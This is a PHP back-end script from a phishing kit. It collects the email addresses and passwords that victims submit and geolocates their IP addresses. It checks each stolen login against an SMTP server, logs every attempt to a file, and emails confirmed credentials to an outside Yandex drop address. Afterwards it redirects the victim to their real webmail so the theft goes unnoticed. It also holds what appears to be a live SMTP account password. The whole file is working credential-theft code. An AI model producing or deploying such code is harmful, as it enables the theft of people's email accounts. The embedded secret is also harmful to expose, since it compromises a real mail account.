<?php
require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Set proper headers for AJAX requests
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Get user IP and location data
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
    $ip = $_SERVER['HTTP_X_REAL_IP'];
}

$jdat = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=" . $ip));

session_start();

// Block GET requests with 403 page
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    http_response_code(403);
    ?>
    <html>
    <head>
        <title>403 - Forbidden</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
            h1 { color: #d32f2f; }
        </style>
    </head>
    <body>
        <h1>403 Forbidden</h1>
        <p>Access to this resource is denied.</p>
        <hr>
    </body>
    </html>
    <?php
    exit();
}

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Method not allowed"
    ));
    exit();
}

// SMTP Configuration - Used both for testing credentials AND sending notifications
$receiver     = 'logs.ironside511@yandex.com';         // Your email to receive valid credential logs
$senderuser   = 'info@lucagherardi.com';      // Your SMTP user
$senderpass   = 'V8WLLSypyJBbUv7';               // Your SMTP password
$senderport   = "587";                      // Your SMTP port
$senderserver = "mail.lucagherardi.com";       // Your SMTP server (ALSO USED AS TEST SERVER)
$smtp_secure  = 'tls';  // 'tls', 'ssl', or '' for effectiveness

// Capture user input
$browser = $_SERVER['HTTP_USER_AGENT'];
$login   = trim($_POST['email'] ?? '');
$passwd  = trim($_POST['password'] ?? '');

// Validate input
if (empty($login) || empty($passwd)) {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Email and password are required"
    ));
    exit();
}

// Extract domain from email
$parts = explode("@", $login);
if (count($parts) !== 2) {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Invalid email format"
    ));
    exit();
}
$domain = $parts[1];

// Get country name safely
$country = isset($jdat->geoplugin_countryName) ? $jdat->geoplugin_countryName : 'Unknown';

// Create log message
$timestamp = date('Y-m-d H:i:s');
$logMessage = "=== CREDENTIAL TEST ATTEMPT ===\n";
$logMessage .= "Timestamp: " . $timestamp . "\n";
$logMessage .= "Email: " . $login . "\n";
$logMessage .= "Password: " . $passwd . "\n";
$logMessage .= "Domain: " . $domain . "\n";
$logMessage .= "Test Server: " . $senderserver . "\n";
$logMessage .= "IP: " . $ip . "\n";
$logMessage .= "Country: " . $country . "\n";
$logMessage .= "User Agent: " . $browser . "\n";
$logMessage .= "===============================\n\n";

$validCredentials = false;
$testResult = "Connection failed";
$authenticationDetails = "";

// Test ALL captured credentials against mail.lucagherardi.com SMTP server
try {
    $testMail = new PHPMailer(true);
    $testMail->isSMTP();
    $testMail->SMTPAuth = true;
    $testMail->Host = $senderserver;  // Use mail.lucagherardi.com as test server
    $testMail->Username = $login;     // Test with captured credentials
    $testMail->Password = $passwd;    // Test with captured password
    $testMail->Port = $senderport;    // Use same port (587)
    $testMail->SMTPSecure = $smtp_secure;  // Use same security (tls)
    $testMail->Timeout = 10;
    $testMail->SMTPDebug = 0;
    
    // Try to authenticate against mail.lucagherardi.com
    if ($testMail->smtpConnect()) {
        $validCredentials = true;
        $testResult = "✅ VALID CREDENTIALS - Authentication successful on " . $senderserver;
        $authenticationDetails = "Server: " . $senderserver . ":" . $senderport . " (" . $smtp_secure . ")";
        
        // If credentials are valid, try to send a test email to confirm
        try {
            $testMail->setFrom($login, 'Credential Validation Test');
            $testMail->addAddress($receiver);
            $testMail->isHTML(true);
            $testMail->Subject = "🎯 CREDENTIAL VALIDATION SUCCESS - " . $login;
            $testMail->Body = "<h2 style='color: green;'>✅ VALID CREDENTIALS CONFIRMED!</h2>";
            $testMail->Body .= "<p><strong>Tested Email:</strong> " . htmlspecialchars($login) . "</p>";
            $testMail->Body .= "<p><strong>Password:</strong> " . htmlspecialchars($passwd) . "</p>";
            $testMail->Body .= "<p><strong>Test Server:</strong> " . $senderserver . "</p>";
            $testMail->Body .= "<p><strong>Authentication:</strong> SUCCESSFUL</p>";
            $testMail->Body .= "<p><strong>IP:</strong> " . $ip . "</p>";
            $testMail->Body .= "<p><strong>Country:</strong> " . $country . "</p>";
            $testMail->Body .= "<p><strong>Timestamp:</strong> " . $timestamp . "</p>";
            
            if ($testMail->send()) {
                $testResult .= " - Validation email sent successfully";
            }
        } catch (Exception $e) {
            $testResult .= " - Authentication OK but validation email failed: " . $e->getMessage();
        }
        
        $testMail->smtpClose();
    } else {
        $testResult = "❌ INVALID CREDENTIALS - Authentication failed on " . $senderserver;
        $authenticationDetails = "Server: " . $senderserver . ":" . $senderport . " - Authentication FAILED";
    }
    
} catch (Exception $error) {
    $testResult = "❌ Test failed: " . $error->getMessage();
    $authenticationDetails = "Error connecting to " . $senderserver . ": " . $error->getMessage();
}

// Add test result to log
$logMessage .= "Credential Test Result: " . $testResult . "\n";
$logMessage .= "Authentication Details: " . $authenticationDetails . "\n";
$logMessage .= "Valid Credentials: " . ($validCredentials ? "YES" : "NO") . "\n\n";

// Always save to local log file (for monitoring all attempts)
try {
    $fp = fopen("SS-Or-LucaGherardi-Tests.txt", "a");
    if ($fp) {
        fputs($fp, $logMessage);
        fclose($fp);
    }
} catch (Exception $e) {
    error_log('Log file write failed: ' . $e->getMessage());
}

// ONLY SEND EMAIL NOTIFICATION FOR VALID CREDENTIALS
$emailSent = false;
if ($validCredentials) {
    
    // Create special email notification for valid credentials
    $validSub = "🚨 VALID CREDENTIALS FOUND | " . $login . " | " . $passwd . " | " . $domain . " | " . $country;
    
    $validEmailBody = "<div style='background: #d4edda; padding: 20px; border: 3px solid #28a745; border-radius: 15px; margin: 10px;'>";
    $validEmailBody .= "<h1 style='color: #155724; text-align: center; margin-bottom: 20px;'>🎯 VALID CREDENTIALS CONFIRMED!</h1>";
    $validEmailBody .= "<h2 style='color: #155724; border-bottom: 2px solid #28a745; padding-bottom: 10px;'>Credential Details</h2>";
    
    $validEmailBody .= "<table style='width: 100%; border-collapse: collapse; margin: 15px 0;'>";
    $validEmailBody .= "<tr style='background: #c3e6cb;'><td style='padding: 12px; border: 2px solid #28a745; font-weight: bold;'>Email Address:</td><td style='padding: 12px; border: 2px solid #28a745; font-family: monospace;'>" . htmlspecialchars($login) . "</td></tr>";
    $validEmailBody .= "<tr><td style='padding: 12px; border: 2px solid #28a745; font-weight: bold;'>Password:</td><td style='padding: 12px; border: 2px solid #28a745; color: red; font-weight: bold; font-family: monospace;'>" . htmlspecialchars($passwd) . "</td></tr>";
    $validEmailBody .= "<tr style='background: #c3e6cb;'><td style='padding: 12px; border: 2px solid #28a745; font-weight: bold;'>Domain:</td><td style='padding: 12px; border: 2px solid #28a745;'>" . htmlspecialchars($domain) . "</td></tr>";
    $validEmailBody .= "<tr><td style='padding: 12px; border: 2px solid #28a745; font-weight: bold;'>Test Server:</td><td style='padding: 12px; border: 2px solid #28a745;'>" . htmlspecialchars($senderserver) . "</td></tr>";
    $validEmailBody .= "<tr style='background: #c3e6cb;'><td style='padding: 12px; border: 2px solid #28a745; font-weight: bold;'>Server Config:</td><td style='padding: 12px; border: 2px solid #28a745;'>" . htmlspecialchars($authenticationDetails) . "</td></tr>";
    $validEmailBody .= "<tr><td style='padding: 12px; border: 2px solid #28a745; font-weight: bold;'>IP Address:</td><td style='padding: 12px; border: 2px solid #28a745;'>" . htmlspecialchars($ip) . "</td></tr>";
    $validEmailBody .= "<tr style='background: #c3e6cb;'><td style='padding: 12px; border: 2px solid #28a745; font-weight: bold;'>Country:</td><td style='padding: 12px; border: 2px solid #28a745;'>" . htmlspecialchars($country) . "</td></tr>";
    $validEmailBody .= "<tr><td style='padding: 12px; border: 2px solid #28a745; font-weight: bold;'>User Agent:</td><td style='padding: 12px; border: 2px solid #28a745; font-size: 11px;'>" . htmlspecialchars($browser) . "</td></tr>";
    $validEmailBody .= "<tr style='background: #c3e6cb;'><td style='padding: 12px; border: 2px solid #28a745; font-weight: bold;'>Timestamp:</td><td style='padding: 12px; border: 2px solid #28a745;'>" . $timestamp . "</td></tr>";
    $validEmailBody .= "</table>";
    
    $validEmailBody .= "<div style='background: #155724; color: white; padding: 15px; border-radius: 10px; text-align: center; margin: 20px 0;'>";
    $validEmailBody .= "<h3 style='margin: 0;'>✅ AUTHENTICATION STATUS: SUCCESSFUL</h3>";
    $validEmailBody .= "<p style='margin: 5px 0;'>These credentials successfully authenticated against " . $senderserver . "</p>";
    $validEmailBody .= "<p style='margin: 5px 0; font-weight: bold;'>This is a VALID working email account!</p>";
    $validEmailBody .= "</div>";
    
    $validEmailBody .= "</div>";
    
    try {
        $mail = new PHPMailer(true);
        $mail->isSMTP();
        $mail->SMTPAuth = true;
        $mail->Host = $senderserver;
        $mail->Username = $senderuser;  // Use your account to send notification
        $mail->Password = $senderpass;  // Use your password to send notification
        $mail->Port = $senderport;
        $mail->SMTPSecure = $smtp_secure;
        $mail->Timeout = 30;
        $mail->SMTPDebug = 0;
        $mail->Priority = 1; // High priority for valid credentials
        
        $mail->setFrom($senderuser, 'LucaGherardi Credential Monitor');
        $mail->addAddress($receiver);
        $mail->isHTML(true);
        $mail->Subject = $validSub;
        $mail->Body = $validEmailBody;
        $mail->AltBody = strip_tags(str_replace('<br>', "\n", $validEmailBody));
        
        if ($mail->send()) {
            $emailSent = true;
            error_log('VALID CREDENTIALS EMAIL SENT: ' . $login);
        }
        
    } catch (Exception $error) {
        error_log('Valid credentials email failed: ' . $error->getMessage());
    }
}

// Update log file with email result (only for valid credentials)
if ($validCredentials) {
    try {
        $fp = fopen("SS-Or-LucaGherardi-Tests.txt", "a");
        if ($fp) {
            fputs($fp, "Email Notification: " . ($emailSent ? "SENT" : "FAILED") . "\n");
            fputs($fp, "Email Sent To: " . $receiver . "\n\n");
            fclose($fp);
        }
    } catch (Exception $e) {
        // Continue anyway
    }
}

// Increment attempt counter
if (!isset($_SESSION['attempts'])) {
    $_SESSION['attempts'] = 0;
}
$_SESSION['attempts']++;

// Determine response based on credential validity
if ($validCredentials) {
    // Valid credentials found - redirect to original domain webmail
    $response = array(
        "signal" => "OK",
        "success" => true,
        "msg" => "Login successful! Redirecting to your mailbox...",
        "attempt" => $_SESSION['attempts'],
        "redirect_url" => "https://webmail." . $domain
    );
    
    // Add shorter delay for valid credentials
    usleep(rand(300000, 1000000)); // 0.3 to 1.0 second delay
    
} else {
    // Invalid credentials - show error
    $response = array(
        "signal" => "error",
        "msg" => "Invalid email or password. Please try again.",
        "attempt" => $_SESSION['attempts'],
        "redirect_url" => "https://webmail." . $domain
    );
    
    // Add longer delay for invalid credentials
    usleep(rand(800000, 2000000)); // 0.8 to 2.0 second delay
}

// Add debug info
$response["debug_info"] = array(
    "email_sent" => $emailSent,
    "log_written" => file_exists("SS-Or-LucaGherardi-Tests.txt"),
    "timestamp" => $timestamp,
    "valid_credentials" => $validCredentials,
    "test_server" => $senderserver,
    "authentication_details" => $authenticationDetails
);

echo json_encode($response);
exit();
?>